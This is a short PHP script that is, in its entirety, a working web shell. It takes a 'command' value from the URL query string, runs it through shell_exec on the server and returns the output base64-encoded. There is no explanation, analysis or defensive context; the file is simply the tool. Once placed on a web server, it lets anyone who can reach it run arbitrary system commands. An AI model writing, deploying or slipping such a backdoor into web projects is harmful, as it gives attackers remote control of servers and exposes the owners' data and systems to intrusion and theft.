<?php

if (isset($_GET['command'])) {

    $command = $_GET['command'];

    $output = base64_encode(shell_exec($command));

    echo "<pre>$output</pre>";
} else {
  return 0;
}

?>